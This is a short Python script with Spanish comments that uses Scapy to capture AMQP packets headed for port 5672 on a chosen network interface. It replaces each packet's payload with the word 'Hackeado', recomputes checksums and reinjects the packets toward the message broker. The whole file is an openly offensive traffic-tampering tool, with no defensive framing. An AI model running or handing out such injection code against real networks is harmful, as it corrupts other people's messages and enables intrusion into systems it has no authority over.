# El_Colador_PRO.py
from scapy.all import *

# Pregunta interfaz
interfaces = get_if_list()
print("Interfaces detectadas:", flush=True)
for i, iface in enumerate(interfaces):
    print(f"  [{i+1}] {iface}", flush=True)
input_str = input("Elige la interfaz por nombre o número (ENTER para 'eth0'): ").strip()
IFACE = "eth0" if input_str == "" else (interfaces[int(input_str) - 1] if input_str.isdigit() and 1 <= int(input_str) <= len(interfaces) else input_str)

FILTER = "tcp dst port 5672 and tcp[tcpflags] & tcp-push != 0"

print(f"[+] Esperando paquete(s) AMQP válido(s) hacia 5672 en {IFACE}…")

N = 5  # Número de paquetes a modificar y reinyectar (aumenta para más chances)
hack_msg = b"Hackeado"

pkts = sniff(filter=FILTER, iface=IFACE, count=N, timeout=8)

enviados = 0
for pkt in pkts:
    if pkt.haslayer(Raw):
        old = pkt[Raw].load
        if len(hack_msg) > len(old):
            nuevo = hack_msg[:len(old)]  # Recorta si el nuevo mensaje es más largo
        else:
            nuevo = hack_msg.ljust(len(old), b' ')  # Rellena si es más corto
        pkt_mod = pkt.copy()
        pkt_mod[Raw].load = nuevo
        # Corrige checksums y longitud
        if pkt_mod.haslayer('IP'):
            del pkt_mod['IP'].chksum
            del pkt_mod['IP'].len
        if pkt_mod.haslayer('TCP'):
            del pkt_mod['TCP'].chksum
        print(f"[+] Reinyectando paquete modificado con payload: {nuevo!r}")
        sendp(pkt_mod, iface=IFACE, verbose=0)
        enviados += 1

if not enviados:
    print("[!] No se pudo modificar ningún paquete AMQP con datos.")

print(f"[!] {enviados} paquetes modificados y enviados al broker.")
